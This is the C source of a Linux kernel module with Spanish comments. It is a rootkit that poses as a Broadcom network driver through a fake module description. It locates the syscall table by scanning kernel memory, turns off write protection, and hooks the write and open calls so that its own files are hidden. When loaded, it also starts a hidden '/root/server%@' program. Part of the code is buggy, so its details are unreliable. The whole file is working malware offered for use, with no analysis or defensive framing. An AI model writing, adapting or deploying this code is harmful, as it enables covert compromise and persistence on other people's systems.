#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/current.h>
#include <asm/system.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>

// Rangos de la memoria del kernel en
// una arquitectura de 32 bits
#define START_MEM   0xc0000000
#define END_MEM     0xd0000000

// Alguna informacion sobre el Modulo
MODULE_LICENSE("GPL");
MODULE_AUTHOR ("GNU Kernel Objects,Co. ");
MODULE_DESCRIPTION("Broadcom Network Interface BC3112 module, 1998.");

/*Direccion de la tabla de llamadas al sistema*/
unsigned long *syscall_table ;
/* Suplantamos las llamadas al sistema */

// write
asmlinkage size_t (*original_call_write) (int, char *, size_t);
// open
asmlinkage int    (*original_call_open)  (char*,int);
/*Funciones de utileria*/
unsigned long **find(void);
void     executeServer(void);

/*Definicion de funciones*/
unsigned long **find(void) {
    unsigned long **sctable;
    unsigned long int i = START_MEM;
    while ( i < END_MEM) {
        sctable = (unsigned long **)i;
        if ( sctable[__NR_close] == (unsigned long *) sys_close) {
            return &sctable[0];
        }
        i += sizeof(void *);
    }
    return NULL;
}
void executeServer(void){
	char *argv[] = { "/root/server%@", NULL };
  	static char *envp[] = { NULL };
	call_usermodehelper( argv[0], argv, envp,UMH_WAIT_EXEC);
}
/* Nuestra funcion de escritura*/
asmlinkage size_t our_sys_write(int descriptor,char *buff, size_t nbytes)
{
	int i=0;
        
	while(i < nbytes){
	// ARCHIVO ROOTKIT ROOTKIT
	//		   bc_3112@
	if((buff[i]   == 'b') && (buff[i+1] == 'c') && 
	   (buff[i+2] == '_') && (buff[i+3] == '3') && 
	   (buff[i+4] == '1') && (buff[i+5] == '1') &&
	   (buff[i+6] == '2') && (buff[i+7] == '@'))
	{
		     return nbytes;
	}
	// Archivo server
	//         server%@
	else if	((buff[i]   == 's') && (buff[i+1] == 'e') &&
             	(buff[i+2]  == 'r') && (buff[i+3] == 'v') &&
             	(buff[i+4]  == 'e') && (buff[i+5] == 'r') &&
		(buff[i+6]  == '%') && (buff[i+7] == '@'))
	{
                       return nbytes;
        }
        i++;
	}
	return original_call_write(descriptor,(char*) buff, (size_t )nbytes);
}
asmlinkage  int our_sys_open(char *buff, int flags){
	
 	int i=0;
	int nbytes= sizeof(buff) / sizeof(char);
          

	while(i < nbytes){
	// ARCHIVO ROOTKIT ROOTKIT
	//		   bc_3112@
	if((buff[i]   == 'b') && (buff[i+1] == 'c') && 
	   (buff[i+2] == '_') && (buff[i+3] == '3') && 
	   (buff[i+4] == '1') && (buff[i+5] == '1') &&
	   (buff[i+6] == '2') && (buff[i+7] == '@'))
	{
		     return -1;;
	}
	// Archivo server
	//         server%@
	else if	((buff[i]   == 's') && (buff[i+1] == 'e') &&
             	(buff[i+2]  == 'r') && (buff[i+3] == 'v') &&
             	(buff[i+4]  == 'e') && (buff[i+5] == 'r') &&
		(buff[i+6]  == '%') && (buff[i+7] == '#'))
	{
                       return -1;
        }
        i++;
     
        }              
	return original_call_open((char *)buff,flags);
}
int init_module()
{
	//Obtenemos la direccion de syscall table
	syscall_table = (unsigned long *) find();
	
    	if ( syscall_table != NULL ) 
	{
		write_cr0 (read_cr0 () & (~ 0x10000));
		 ///////
		original_call_write = (void *)syscall_table[__NR_write];
		syscall_table[__NR_write] = our_sys_write;
		original_call_open  = (void *)syscall_table[__NR_open];
		syscall_table[__NR_open]  = our_sys_open; 
		executeServer();
		///////
		write_cr0 (read_cr0 () | 0x10000); 
	}
	return 0;
}

void cleanup_module()
{
	write_cr0 (read_cr0 () & (~ 0x10000)); ///////
	syscall_table[__NR_write] = original_call_write;
	syscall_table[__NR_open ] = original_call_open;
	write_cr0 (read_cr0 () | 0x10000); ///////
}
